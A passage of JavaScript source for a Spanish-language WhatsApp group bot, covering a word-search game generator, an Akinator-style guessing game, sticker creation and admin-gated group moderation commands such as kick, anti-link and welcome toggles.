'GEOGRAFIA', 'GITHUB', 'HIPHOP', 'HISTORIA', 'INNOVACION', 'JARDINERIA', 'KARATE', 'LENGUAJE', 'LITERATURA', 'MAGIA', 'MARVEL', 'MATRICES', 'MUSICA', 'NATACION', 'NEUROLOGIA', 'NUMEROLOGIA', 'ORNITOLOGIA', 'PAINTBALL', 'PIZZA', 'POLITICA', 'QUIZAS', 'RELOJERIA', 'ROBOTICA', 'SALUD', 'SCIFI', 'SEXOLOGIA', 'SIMPSONS', 'SISTEMAS', 'TALENTO', 'TAROT', 'TOPOGRAFIA', 'TRADICION', 'TRIVIAL', 'URBANISMO', 'UTOPICO', 'VETERINARIA', 'VIAJES', 'ZOOLOGIA', 'NARUTO', 'DRAGONBALL', 'ONEPIECE', 'ATTACKTITAN', 'DEATHNOTE', 'BLEACH', 'FULLMETAL', 'SWORDONLINE', 'FAIRYTAIL', 'HEROACADEMIA', 'DEMONSLAYER', 'BLACKCLOVER', 'HUNTER', 'TOKYO', 'BOKUNOHERO', 'COWBOYBEBOP', 'CODEGEASS', 'EVANGELION', 'KIMETSU', 'STEINS', 'GINTAMA', 'YUYUHAKUSHO', 'GURREN', 'JOJOBIZARRE', 'ONEPUNCHMAN', 'KON', 'CLANNAD', 'HAIKYUU', 'AKIRA', 'GHOSTSHELL', 'YOURLIE', 'SAILORMOON', 'POKEMON', 'DIGIMON', 'PRINCESS', 'SPIRITED', 'MOCASTLE', 'MYTOTORO',
'PINTURA', 'DIBUJAR', 'ESBOZAR', 'ACUARELA', 'ESCULTURA', 'RETRATO', 'ABSTRACTO', 'PAISAJE', 'ARTESANIA', 'ESTAMPAR', 'TALLERES', 'CERAMICA', 'ESTAMPAR', 'DIBUJANT', 'GALERIAS', 'FOTOGRAF', 'ESTAMPAD', 'MUSEOS', 'ARTISTAS', 'COMICS', 'OBRASART', 'ESCENOGRA', 'ACRILICO', 'GRABADOS', 'HISTORIA', 'BELLASART', 'PINTORES', 'RETRATOS', 'FIGURATIV', 'IMPRESION', 'OLEO', 'PAPERCUT', 'PINCELES', 'ESCULTORE', 'BARRO', 'FOTOGRAFO', 'ACRILICOS', 'AEROGRAFO', 'ESCULTURAS', 'RELIEVES', 'PIGMENTOS', 'CARBONCIL', 'ESTAMPADO', 'FOTOGRAFI', 'RETRATIST', 'VINILO', 'EPOXICO', 'FOTOGRAFIA', 'ARTESANAS', 'TALLERIST', 'ARTENEGRO', 'ARTISTICA', 'PINTARRON', 'GISELLES', 'ESTATUAS', 'BODEGONES', 'RETRATAR', 'ACUARELAS', 'ESCULTORI', 'TRIPTICOS', 'FOTOMURAL', 'RETABLOS', 'BODEGONIS', 'GRABADORA', 'CURSOARTE', 'MANUALIDA', 'DIBUJANTE', 'LAMINADOS', 'ESCULTORAS', 'PINCELAZO', 'CARTONERA', 'ESTARCIDO', 'HUELLISTA', 'IMPRESORA', 'PINCELETA', 'PUNTILLIS', 'LITOGRAFO', 'OLEOSOBRE', 'TEJEDURIA', 'TINTOREAS', 'TIZIANOVA', 'ARTEFLOR', 'BELLASARTS', 'BRONCESOB', 'FOTOGRAFAS', 'MUSEOGRAFO', 'PINTURAEN', 'RETRATARO', 'TRAMPANTO', 'ZONAARTE', 'ACRILICASS', 'ESCULTURAS', 'ESTAMPACION', 'FOTOMONTAJE', 'MURALISTAS', 'PAISAJISMO', 'PINTORAS', 'PREHISTORIC', 'RETRATANDO', 'TEMPELATES', 'ACUARELIST', 'AEROGRAFOS', 'BARROCOS', 'BODEGONIST', 'CARBONCILS', 'CARTONERAS', 'CURSOSARTE', 'DIBUJANTES', 'ESTARCIDOS', 'FOTOGRAFOS', 'GRABADORES', 'LAMINADORA', 'LITOGRAFOS', 'OLEOGRAFIA', 'PAPELMAKIS', 'PINTARRONES', 'PINCELAZOS', 'PUNTILLISM', 'RETABLISTA', 'TALLERISTAS', 'TEJEDURIAS', 'TIZIANOS', 'VANGUARDIS', 'VINILOSADH', 'ESTATUILLA',
'PASARELA', 'VESTIDOS', 'MODELOS', 'ESTAMPADO', 'CALZADO', 'BISUTERIA', 'COMPLEMENTO', 'BOUTIQUE', 'TENDENCIA', 'AGUJA', 'HILO', 'FASHION', 'MARCAS', 'TEXTIL', 'CORTE', 'ESTAMPADO', 'LOOK', 'CONFECCION', 'COSTURA', 'ACCESORIO', 'ESTAMPADO', 'FASHIONISTA', 'GLAMOUR', 'GAMA', 'BRILLO', 'ESTAMPADO', 'TELA', 'ESTAMPADO', 'PASION', 'TIENDA', 'VESTUARIO', 'ZAPATO', 'DESFILE', 'COSER', 'MODISTA', 'CHAQUETA', 'PIEL', 'CAMISA', 'ESTAMPADO', 'CAMISETA', 'PEINADO', 'MAQUILLAJE', 'ESTILO', 'OUTFIT', 'MAGAZINE', 'FORTNITE', 'OVERWATCH', 'LEAGUEOFLEG', 'DOTA', 'WARFRAME', 'DESTINY', 'MINECRAFT', 'HEARTHSTONE', 'WORLDWART', 'COUNTERSTRK', 'ROBLOX', 'RUNESCAPE', 'TERRARIA', 'PALADINS', 'SMITE', 'ARCHEAGE', 'GUILDWARS', 'BLACKDESERT', 'TERA', 'ALBIONONLIN', 'BRAWLHALLA', 'APEXLEGEND', 'VALORANT', 'TEAMFIGHT', 'PUBG', 'HALOGUARD', 'SEAOFTHIEVE', 'STARCRAFT', 'HEROESSTOR', 'WOWCLASSIC', 'OLDSCROLLO', 'DIABLO', 'FINALFANTASY', 'ESCAPEFROM', 'RUST', 'AMONGUS', 'IMPOSTER', 'FALLGUYS', 'PHASMOPHOB', 'ROCKETLEAG', 'FORHONOR', 'MEXICO', 'BRASIL', 'FRANCIA', 'ALEMANIA', 'ITALIA', 'JAPON', 'CHINA', 'RUSIA', 'CANADA', 'AUSTRALIA', 'SPAIN', 'ARGENTINA', 'COLOMBIA', 'PORTUGAL', 'SUIZA', 'SUECIA', 'NORUEGA', 'HOLANDA', 'BELGICA', 'DINAMARCA', 'POLONIA', 'HUNGRIA', 'AUSTRIA', 'CROACIA', 'SERBIA', 'RUMANIA', 'BULGARIA', 'GRECIA', 'TURQUIA', 'EGIPTO', 'MARRUECOS', 'SUDAFRICA', 'NIGERIA', 'KENIA', 'ETIOPIA', 'CHILE', 'PERU', 'ECUADOR', 'BOLIVIA', 'PARAGUAY', 'URUGUAY', 'CUBA', 'JAMAICA', 'HAITI', 'PUERTORICO', 'REPDOMINICANA', 'VENEZUELA', 'NICARAGUA', 'GUATEMALA', 'ELSALVADOR', 'HONDURAS', 'PANAMA', 'COSTARICA', 'BELICE', 'IRLANDA', 'INGLATERRA', 'ESCOCIA', 'GALES', 'USA', 'RUMANIA', 'UCRANIA', 'NUEVAZELANDA', 'FIJIS', 'SAMOA', 'TONGA', 'VANUATU', 'KIRIBATI', 'MICRONESIA', 'PALAU', 'NAURU', 'TUVALU', 'SALOMON', 'TUVALU', 'SURINAM', 'GUYANA', 'PERU', 'BRAZIL', 'MEXICO', 'ARGENTINA', 'COLOMBIA', 'VENEZUELA', 'CHILE', 'ECUADOR', 'BOLIVIA', 'URUGUAY', 'PARAGUAY', 'COSTARICA', 'HONDURAS', 'NICARAGUA', 'PANAMA', 'GUATEMALA', 'ELSALVADOR',
'MERCADO', 'EMPLEO', 'INFLACION', 'PRODUCTO', 'CONSUMO', 'IMPUESTO', 'MONEDA', 'BANCA', 'FISCALIDAD', 'CREDITO', 'FINANZAS', 'NEGOCIOS', 'COMERCIO', 'EXPORTACION', 'IMPORTACION', 'DEVALUACION', 'DEMANDA', 'OFERTA', 'RECESION', 'DEFLACION', 'INVERSION', 'CRECIMIENTO', 'DEUDA', 'DEFICIT', 'ESTIMULO', 'BOLSAMX', 'DIVISA', 'TARIFA', 'SUBSIDIO', 'EXCEDENTE', 'CICLO', 'FONDO', 'VALOR', 'GANANCIA', 'SALARIO', 'MONOPOLIO', 'OLIGOPOLIO', 'MERCADEO', 'COMERCIAL', 'BALANZA', 'PATRONAL', 'MERCANTIL', 'PROTECCION', 'MULTINACIONAL', 'ARANCEL', 'EMPRENDEDOR', 'CAPITALISMO', 'SOCIALISMO', 'GLOBAL', 'NEOLIBERAL', 'COOPERATIVA', 'MUNDO', 'ECONOMIA', 'COMPETENCIA', 'ESTADO', 'SOSTENIBLE', 'INNOVACION', 'INCENTIVO', 'MARKETING', 'INVERSION', 'FABRICANTE', 'MERCADOTECNIA', 'DISTRIBUCION', 'PRESTAMO', 'NEGOCIACION', 'SUPERAVIT', 'DEVALUAR', 'DEVALOR', 'CRISIS', 'EMPRENDER', 'VENTA', 'RENTA', 'UTILIDAD', 'BANCARIO', 'FINANCIAR', 'COTIZACION', 'REMESA', 'SEGURO', 'FIDUCIARIO', 'HACIENDA', 'COMISION', 'PRODUCCION', 'ECONOMISTA', 'COMPRAR', 'VENDEDOR', 'MONETARIO', 'DESCUENTO', 'CONTRABANDO', 'CATASTRO', 'SINDICALISMO', 'CUBRIR', 'CAPITAL', 'AHORRO', 'GASTO', 'BANQUERO', 'CAJA', 'EMPRESARIO', 'COMERCIAL', 'GASTOS', 'INGRESO', 'ECONOMETRIA', 'FUSION', 'COMPRAVENTA', 'REMATE', 'COMISIONISTA', 'SUBASTA', 'EQUILIBRIO', 'OFERTANTE', 'DEMANDANTE', 'EMPRESA', 'ETICA', 'CONTRATO', 'TASA', 'COSTO', 'INDUSTRIA', 'PROVEEDOR', 'PAGARE', 'CICLOPE', 'CONSUMIDOR', 'PRODUCCION', 'VENDER', 'DEVALUACION', 'ABARATAR', 'INSOLVENCIA', 'LIQUIDACION', 'AMORTIZACION', 'ACCIONISTA', 'INTERES', 'PRODUCTOR', 'PRECIOS', 'ESPECULACION', 'MATERIA', 'PRIMA', 'IMPORTADOR', 'EXPORTADOR', 'IMPORTE', 'EXPORTA', 'CONTABLE',
'ESTADIO', 'MUNDIAL', 'GOLEADOR', 'TROPICAL', 'CANGURO', 'TIGRILLO', 'NEBULOSA', 'ANDROMEDA', 'SELVA', 'SATELITE', 'COLISEO', 'AMAZONAS', 'PUMA', 'CAMELLO', 'MAGALLANES', 'LUNA', 'COMETA', 'ORION', 'JUPITER', 'ARCOIRIS', 'ELEFANTE', 'CROACIA', 'TORRE', 'GALAXIA', 'BALON', 'ATLANTICO', 'CORDILLERA', 'CEBRA', 'TIGRE', 'ROCA', 'METEORITO', 'GATO', 'HIPODROMO', 'LEOPARDO', 'MARTE', 'VENUS', 'POLVO', 'BURJKHALIFA', 'TORREEIFFEL', 'TORREDEPISA', 'ABUDHABI', 'NAIROBI', 'PAISESBAJOS', 'ISRAEL', 'SINGAPUR', 'SUECIA', 'BRASIL', 'BALEARES', 'MONTANA', 'GLACIAR', 'RIO', 'LAGO', 'CAVERNA', 'LIMON', 'MANZANA', 'NARANJA', 'COCODRILO', 'RINOCERONTE', 'ESCARABAJO', 'PINGUINO', 'TUCAN', 'TORTUGA', 'CHIMPANCE', 'JIRAFA', 'KANGAROO', 'WALLABY', 'MURCIELAGO', 'SABANA', 'DUNA', 'GALLO', 'CONEJO', 'MARISCAL', 'ZAFIRO', 'RUBI', 'ESMERALDA', 'ASTEROIDE', 'ESTRELLA', 'PLANETA', 'COMPUTADORA', 'INTERNET', 'ROBOT', 'SATELITE', 'ALIENIGENA', 'NASA', 'SPACEX', 'ELONMUSK', 'NEPTUNO', 'URANO', 'MERCURIO', 'PLUTON', 'ESPACIAL', 'AGUJERONEGRO', 'CONSTELACION', 'VIOLONCHELO', 'GUITARRA', 'PIANO', 'CONCIERTO', 'COMPOSITOR', 'MUSICA', 'SONIDO', 'VOZ', 'FACEBOOK', 'INSTAGRAM', 'TWITTER', 'SPOTIFY', 'APPLEMUSIC', 'SOUNDCLOUD', 'DEEZER', 'TIDAL', 'PANDORA', 'NETFLIX', 'AMAZONPRIME', 'DISNEY', 'HBO', 'HULU', 'YOUTUBETV', 'ESPN', 'TWITCH', 'REDDIT', 'LINKEDIN', 'SNAPCHAT', 'TELEGRAM', 'SKYPE', 'ZOOM', 'TIKTOPDANCE', 'STORIES', 'TRENDS', 'FILTERS', 'VLOGS', 'PLAYLISTS', 'TAYLORSWIFT', 'ARIANAGRANDE', 'LADYGAGA', 'BILLIEEILISH', 'DUALIPA', 'HARRYSTYLES', 'POSTMALONE', 'JUSTINBIEBER', 'EDSHEERAN', 'SHAWNMENDES', 'LEWISCAPALDI', 'JONAS', 'KATYPERRY', 'RIHANNA', 'ADELE', 'LIZZO', 'CARDIB', 'MILEYCYRUS', 'SELENAGOMEZ', 'JENNIFERLOPEZ', 'DICAPRIO', 'TOMHANKS', 'ANGELINA', 'BRADPITT', 'MERYLSTREEP', 'NICOLEKIDMAN', 'EMMASTONE', 'JOHNTRAVOLTA', 'TOMCRUISE', 'JULIAROBERTS', 'CHRIS', 'SCARLETT', 'ROBERTDOWNEY', 'DWAYNE', 'JIMPARSONS', 'SOFIAVERGARA', 'HARINGTON', 'EMILIACLARKE', 'PETER', 'VIOLADAVIS', 'BRIELARSON', 'TOMHOLLAND', 'DAISYRIDLEY', 'JOHNBOYEGA', 'DAVIDHARBOUR', 'BOBBYBROWN', 'THEGODFATHER', 'GOODFELLAS', 'PULPFICTION', 'THESHINING', 'JAWS', 'STARWARS', 'HARRYPOTTER', 'LORDOFTHERINGS', 'THEMATRIX', 'FIGHTCLUB', 'FORRESTGUMP', 'THETERMINATOR', 'THELIONKING', 'FROZEN', 'COCO', 'TOYSTORY', 'AVENGERS', 'IRONMAN', 'BLACKPANTHER', 'SPIDERMAN', 'CAPTAINAMERICA', 'THOR', 'BATMAN', 'SUPERMAN', 'WONDERWOMAN', 'BREAKINGBAD', 'THECROWN', 'STRANGER', 'WALKINGDEAD', 'WESTWORLD', 'MANDALORIAN', 'TIGERKING', 'THEOFFICE']
const PALABRA = PALABRAS[Math.floor(Math.random() * PALABRAS.length)]
  
let filaInicial = Math.floor(Math.random() * LADO)
let columnaInicial = Math.floor(Math.random() * LADO)
const DIRECCIONES = ["horizontal", "vertical", "diagonalDerecha", "diagonalIzquierda"]
const DIRECCION = DIRECCIONES[Math.floor(Math.random() * DIRECCIONES.length)]

let palabraAgregada = false
while (!palabraAgregada) {
filaInicial = Math.floor(Math.random() * LADO)
columnaInicial = Math.floor(Math.random() * LADO)

// Algoritmo para garantizar la palabra 
let palabraEntra = true;
for (let i = 0; i < PALABRA.length; i++) {
if (DIRECCION === "horizontal" && (columnaInicial + i >= LADO)) {
palabraEntra = false
break;
} else if (DIRECCION === "vertical" && (filaInicial + i >= LADO)) {
palabraEntra = false
break;
} else if (DIRECCION === "diagonalDerecha" && (filaInicial + i >= LADO || columnaInicial + i >= LADO)) {
palabraEntra = false
break;
} else if (DIRECCION === "diagonalIzquierda" && (filaInicial + i >= LADO || columnaInicial - i < 0)) {
palabraEntra = false
break;
}
}

// Si la palabra entra, agregar a la sopa de letras
if (palabraEntra) {
for (let i = 0; i < PALABRA.length; i++) {
if (DIRECCION === "horizontal") {
sopaDeLetras[filaInicial][columnaInicial + i] = PALABRA.charAt(i)
} else if (DIRECCION === "vertical") {
sopaDeLetras[filaInicial + i][columnaInicial] = PALABRA.charAt(i)
} else if (DIRECCION === "diagonalDerecha") {
sopaDeLetras[filaInicial + i][columnaInicial + i] = PALABRA.charAt(i)
} else {
sopaDeLetras[filaInicial + i][columnaInicial - i] = PALABRA.charAt(i)
}
}
palabraAgregada = true;
}
}

// Diseño 
const LETRAS_POSIBLES = "ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓜⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏ"
const numerosUni = ["⓿", "❶", "❷", "❸", "❹", "❺", "❻", "❼", "❽", "❾", "❿", "⓫", "⓬", "⓭", "⓮", "⓯", "⓰", "⓱", "⓲", "⓳", "⓴"]
let sopaDeLetrasConBordes = ""
sopaDeLetrasConBordes += "     " + [...Array(LADO).keys()].map(num => numerosUni[num]).join(" ") + "\n"
//sopaDeLetrasConBordes += "   *╭" + "┄".repeat(LADO) + '┄┄' + "╮*\n"

for (let i = 0; i < LADO; i++) {
let fila = numerosUni[i] + " "

for (let j = 0; j < LADO; j++) {
if (sopaDeLetras[i][j]) {
fila += sopaDeLetras[i][j] + " "
} else {
let letraAleatoria = LETRAS_POSIBLES.charAt(Math.floor(Math.random() * LETRAS_POSIBLES.length))
fila += letraAleatoria + " "
}
}
fila += ""
sopaDeLetrasConBordes += fila + "\n"
}
//sopaDeLetrasConBordes += "   *╰" + "┄".repeat(LADO) + '┄┄' + "╯*"
sopaDeLetrasConBordes = sopaDeLetrasConBordes.replace(/[a-zA-Z]/g, letra => LETRAS_POSIBLES[letra.charCodeAt() - 65] || letra)
await enviar(`🔠 *${PALABRA.split("").join(" ")}* 🔠\n\n` + sopaDeLetrasConBordes.trimEnd())
fila = filaInicial 
columna = columnaInicial
sopaNube = sopaDeLetrasConBordes
sopaPalabra = PALABRA 
sopaDir = DIRECCION.replace(/([A-Z])/g, ' $1').toLowerCase().replace(/^./, str => str.toUpperCase())
}


// AKINATOR
switch(comando) {
case 'personaje':
if(q =="si") {
enviar('😊𝙻𝙾 𝚂𝙰𝙱𝙸𝙰 , 𝙰𝙳𝙸𝚅𝙸𝙽𝙴 𝚃𝚄 𝙿𝙴𝚁𝚂𝙾𝙽𝙰𝙹𝙴')
fs.writeFileSync('./archivos/juegos/akinator.json', JSON.stringify(akinator))
akinator.push(babiee)
} else if(q == "no") {
enviar('🥺𝙽𝙾 𝙰𝙳𝙸𝚅𝙸𝙽𝙴 𝙴𝚂𝚃𝙰 𝚅𝙴𝚉 , 𝚀𝚄𝙸𝚉𝙰 𝙻𝙰 𝙿𝚁𝙾𝚇𝙸𝙼𝙰 𝙿𝚄𝙴𝙳𝙰')
babiee = undefined
fs.writeFileSync('./archivos/juegos/akinator.json', JSON.stringify(akinator))
} else {
enviar("[🍿] Digite personaje si , si en caso adivine, caso contrario digita personaje no, si en caso no adivine")
}
break
case 'noakinator':
enviar('😊𝙶𝚁𝙰𝙲𝙸𝙰𝚂 𝙿𝙾𝚁 𝙹𝚄𝙶𝙰𝚁 𝙲𝙾𝙽 𝙽𝙾𝚂𝙾𝚃𝚁𝙾𝚂, 𝙷𝙰𝚂𝚃𝙰 𝙻𝙰 𝙿𝚁𝙾𝚇𝙸𝙼𝙰, 𝙲𝚄𝙸𝙳𝙰𝚃𝙴 𝙼𝚄𝙲𝙷𝙾') 
if(babiee) return enviar('🥺𝙻𝙾 𝚂𝙸𝙴𝙽𝚃𝙾 𝙼𝚄𝙲𝙷𝙾 𝙿𝙴𝚁𝙾 𝙰𝙻𝙶𝚄𝙸𝙴𝙽 𝚈𝙰 𝚂𝙴 𝙴𝙽𝙲𝚄𝙴𝙽𝚃𝚁𝙰 𝙹𝚄𝙶𝙰𝙽𝙳𝙾, 𝙽𝙾 𝙸𝙽𝚃𝙴𝚁𝚁𝚄𝙼𝙿𝙰𝚂 𝙿𝙾𝚁𝙵𝙰𝚅𝙾𝚁')
break
}




switch(comando) {
case 'menu' : case 'menú': case 'help': case 'bot':
enviarfoto2(menuS,menuprincipal)
break
case "infobot":
enviarVideitos(videoMenu,infoBot)
break
case 'welcome':  case 'bemvindo':
        if (!isGroup) return enviar(respuesta.grupos)
        if (!groupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
        if (Number(args[0]) === 1) {
          if (isWelkom) return enviar(respuesta.activos)
          welkom.push(from)
          fs.writeFileSync('./archivos/antis/welkom.json', JSON.stringify(welkom))
          enviar(respuesta.onactivo)
        } else if (Number(args[0]) === 0) {
          if (!isWelkom) return enviar(respuesta.desactivos)
          pesquisar = from
          processo = welkom.indexOf(pesquisar)
          while (processo >= 0) {
            welkom.splice(processo, 1)
            processo = welkom.indexOf(pesquisar)
          }
          fs.writeFileSync('./archivos/antis/welkom.json', JSON.stringify(welkom))
          enviar(respuesta.offactivo)
        } else {
          enviar(respuesta.error)
        }
        break
case 'antilink':
        if (!isGroup) return enviar(respuesta.grupos)
        if (!groupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(respuesta.correctamente)
if (Number(args[0]) === 1) {
if (isAntiLink) return enviar(respuesta.activos)
antilink.push(from)
fs.writeFileSync('./archivos/antis/antilink.json', JSON.stringify(antilink))
enviar(respuesta.onactivo)
} else if (Number(args[0]) === 0) {
          if (!isAntiLink) return enviar(respuesta.desactivos)
antilink.splice(from, 1)
fs.writeFileSync('./archivos/antis/antilink.json', JSON.stringify(antilink))
enviar(respuesta.offactivo)
} else {
enviar(respuesta.correctamente)
}
break
case 'anticatalogo': case 'anticatalg':  
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(respuesta.correctamente)
if (Number(args[0]) === 1) {
if (isAnticatalogo) return enviar(respuesta.activos)
anticatalogo.push(from)
fs.writeFileSync('./archivos/antis/anticatalogo.json', JSON.stringify(anticatalogo))
enviar(respuesta.onactivo)
} else if (Number(args[0]) === 0) {
          if (!isAnticatalogo) return enviar(respuesta.desactivos)
pesquisar = from
processo = anticatalogo.indexOf(pesquisar)
while(processo >= 0){
anticatalogo.splice(processo, 1)
processo = anticatalogo.indexOf(pesquisar)
}
fs.writeFileSync('./archivos/antis/anticatalogo.json', JSON.stringify(anticatalogo))
enviar(respuesta.offactivo)
} else {
enviar(respuesta.correctamente)
}
break
case 'ban': case 'kick': case 'kit2': case 'ban2': case 'bam': case 'largo': case 'largate': case 'kit':
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
{
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return enviar('[❗️] *Remarque el mensaje de la persona que desea eliminar*')
if(info.message.extendedTextMessage.contextInfo.participant !== null && info.message.extendedTextMessage.contextInfo.participant != undefined && info.message.extendedTextMessage.contextInfo.participant !== "") {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
let responseb = await sock.groupParticipantsUpdate(from, [mentioned], 'remove')
if (responseb[0].status === "200") return sock.sendMessage(from,{ text :  `*[❗️] ${mentionedJid[0]} *Fue eliminado del Grupo*\n🍒 𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁: @${sender.split('@')[0]}` , mentions: [mentionedJid[0], sender]})
else if (responseb[0].status === "406") return enviar('[❗️*No puedo eliminar al Administrador*]')
else if (responseb[0].status === "404") return enviar('*[❗️] No puede eliminar a este usario porque ya no está en el grupo*')
else return enviar('[❗️] *Intenta Nuevamente*')
} else if (info.message.extendedTextMessage.contextInfo.mentionedJid != null && info.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(mentioned.length > 1) {
if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return enviar(`💣`)
sexocomrato = 0
for (let banned of mentioned) {
await sleep(100)
let responseb2 = await loli.groupParticipantsUpdate(from, [banned], 'remove')
if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
}
return enviar(``)
} else {
let responseb3 = await sock.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
if (responseb3[0].status === "200") return sock.sendMessage(from,{ text :  `*[❗️] ${responseb3[0]} *Fue eliminado del Grupo*\n🍒 𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁: @${sender.split('@')[0]}` , mentions: [mentionedJid[0], sender]})
else if (responseb3[0].status === "406") return enviar('[❗️*No puedo eliminar al Administrador*]')
else if (responseb3[0].status === "404") return enviar('*[❗️] No puede eliminar a este usario porque ya no está en el grupo*')
else return enviar('[❗️] *Intenta Nuevamente*')
}
}
}
break

case 'antidocumento': case 'antidoc':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(respuesta.correctamente)
if (Number(args[0]) === 1) {
if (Antidoc) return enviar(respuesta.activos)
antidoc.push(from)
fs.writeFileSync('./archivos/antis/antidoc.json', JSON.stringify(antidoc))
enviar(respuesta.onactivo)
} else if (Number(args[0]) === 0) {
if (!Antidoc) return enviar(respuesta.desactivos)
pesquisar = from
processo = antidoc.indexOf(pesquisar)
while(processo >= 0){
antidoc.splice(processo, 1)
processo = antidoc.indexOf(pesquisar)
}
fs.writeFileSync('./archivos/antis/antidoc.json', JSON.stringify(antidoc))
enviar(respuesta.offactivo)
} else {
enviar(respuesta.correctamente)
}
break
case 'figu': case 'figu2': case 'stickergif':  case 'stickergif2': case 's': case 'f': case 'fig': case 'sticker':

if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
try{
enviar("[⏳️] Creando Sticker ..")       
streammmmm = await downloadContentFromMessage(info.message.imageMessage || info.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
    var buffer = Buffer.from([])
    for await(const chunk of streammmmm) {
     buffer = Buffer.concat([buffer, chunk])
    }
    let ran = 'stickers.webp'
    fs.writeFileSync(`./${ran}`, buffer)
     ffmpeg(`./${ran}`)
     .on("error", console.error)
     .on("end", () => {
      exec(`webpmux -set exif ./database/${ran} -o ./${ran}`, async (error) => {
       await enviarfiguimg(from, fs.readFileSync(`./${ran}`), info, {
 packname: `${pushname}`, author: `${author}`
})
        fs.unlinkSync(`./${ran}`)
			       
       })
      })
	 .addOutputOptions([
       "-vcodec", 
 	   "libwebp", 
 	   "-vf", 
	"scale=512:512:force_original_aspect_ratio=decrease,fps=15, pad=512:512:(ow-iw)/2:(oh-ih)/2:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"
	  ])
	 .toFormat('webp')
	 .save(`${ran}`)	 
    } catch(e) {
enviar(remarcaimg)
}} else if ((isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11)) {
try{
enviar("[⏳️] Creando StickerGif ..")
const encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage: info.message.videoMessage
rane = ('./tmp/D_Juls.'+ await getExtension(encmedia.mimetype))
imgbuff = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, imgbuff)
const media = rane
ran = getRandom('.'+media.split('.')[1])
const upload = await TelegraPh(media)
await enviarfiguvid(from, util.format(upload), info, {
 packname: `${pushname}`, author: `${author}`
}) 
} catch(e) {
enviar(respuesta.error)
}}
          break 
case 'toimg':
if(!isGroup) return enviar(respuesta.grupos)
if(!isGroup) return enviar(respuesta.grupos) 
if (!isQuotedSticker) return enviar(respuesta.remarcasticker)
enviar("[⏳️] *Transformando Sticker a imagen*")
try{
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "image")
sock.sendMessage(from, {image: buff, caption : respuesta.pedido}, {quoted: info})
     
} catch(e) {
console.log(e)
enviar(respuesta.error)
}
break
case 'grupo':
if(!isGroup) return enviar(respuesta.grupos)
if(!isGroupAdmins) return enviar(respuesta.admin)
if(!isBotGroupAdmins) return enviar(respuesta.botadmin)
if(!q) return enviar(respuesta.textito)
try {
if(q =="a") {
await sock.groupSettingUpdate(from, "not_announcement")
enviar(`[❗️] *Uffff , Gracias ${pushname}, Él grupo fue Abierto exitosamente*\n *Me sentía solo 🥺 Porque nadie hablaba conmigo*`)
} else if(q == "c") {
await sock.groupSettingUpdate(from, "announcement")
enviar(`[⛔️] *Él grupo fue cerrado por ${pushname}* \n*Fue un largo día , es momento de descansar un poco*`)
} else {
enviar("[⛔️] *Digite grupo c para cerrar el grupo o grupo a para abrirlo* ")
}
} catch {
enviar(respuesta.error)
}
break
case 'fotobot': 
if(!q) return enviar(respuesta.fotolink2)
if(!isOwner) return enviar(respuesta.dono)
enviar("[⏳️] *Cambiando Foto del Bot*")
try{
const fotix = "" + q + ""
setTimeout(async function () {
renovarimagen(menuS,fotix)
 }, 10)   
enviar(respuesta.reiniciar)
 } catch {
 enviar(respuesta.error)
 }
break
case 'nombrebot': 
if(!q) return enviar(respuesta.textito)
if(!isOwner) return enviar(respuesta.dono)
enviar("[⏳️] *Cambiando Nombre del Bot*")
try{
const fotixm = "" + q + ""
setTimeout(async function () {
renovarimagen(nombreBott,fotixm)
 }, 10)   
enviar(respuesta.reiniciar)
 } catch {
 enviar(respuesta.error)
 }
break
case 'imageurl': case 'imagelink': case 'imglink': case 'gerarlink':  case 'imgpralink': case 'linkimg':
if(!isGroup) return enviar(respuesta.grupos)
if (!isQuotedImage) return enviar(respuesta.fotolink)  
enviar("[📷] *Subiendo Imagen a un servidor*")
try{
var encmediass = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage: info.message.imageMessage
var raneee = ('./tmp/Db_Juls.'+ await getExtension(encmediass.mimetype))
var imgbuffee = await getFileBuffer(encmediass, 'image')
fs.writeFileSync(raneee, imgbuffee)
var mediass = raneee
var rannn = getRandom('.'+mediass.split('.')[1])
var uploadd44 = await TelegraPh(mediass)
await sock.sendMessage(from,{ text : `*[❗️ ] ${pushname}*, *Aquí está el link de su imagen* : \n ${uploadd44}`},{ quoted : info})
} catch(e) {
enviar(respuesta.error)
}
break
case 'audiobot': 
if(!q) return enviar(respuesta.audiolink)
if(!isOwner) return enviar(respuesta.dono)
